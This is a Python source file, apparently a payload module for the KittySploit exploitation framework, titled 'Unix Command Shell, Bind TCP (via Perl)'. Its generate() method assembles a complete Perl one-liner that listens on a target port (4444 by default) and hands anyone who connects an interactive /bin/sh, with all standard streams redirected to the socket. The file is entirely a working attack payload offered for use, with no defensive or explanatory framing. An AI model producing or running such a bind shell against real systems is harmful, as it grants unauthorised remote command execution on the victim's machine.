from kittysploit import *


class Module(Payload):

    __info__ = {
        'name': 'Unix Command Shell, Bind TCP (via Perl)',
        'description': 'Listen on the target and expose an interactive command shell via Perl IO::Socket',
        'author': 'KittySploit Team',
        'category': PayloadCategory.CMD,
        'arch': Arch.PERL,
        'platform': Platform.UNIX,
        'listener': 'listeners/multi/bind_tcp',
        'handler': Handler.BIND,
        'session_type': SessionType.SHELL
    }

    rhost = OptString('0.0.0.0', 'Address to bind on the target', True)
    rport = OptPort(4444, 'Port to bind on the target', True)
    shell_binary = OptString('/bin/sh', 'The system shell in use', True, True)
    perl_binary = OptString('perl', 'Perl binary', True)
    encoder = OptString('', 'Encoder', False, True)

    def generate(self):
        shell = str(self.shell_binary).replace("'", "'\"'\"'")
        return (
            f"{self.perl_binary} -MIO::Socket::INET -e "
            f"'$s=IO::Socket::INET->new(LocalAddr=>\"{self.rhost}\",LocalPort=>{int(self.rport)},"
            f"Listen=>1,Reuse=>1)or die$!;$c=$s->accept();"
            f"open(STDIN,\"<&\",$c);open(STDOUT,\">&\",$c);open(STDERR,\">&\",$c);"
            f"system q({shell} -i);'"
        )
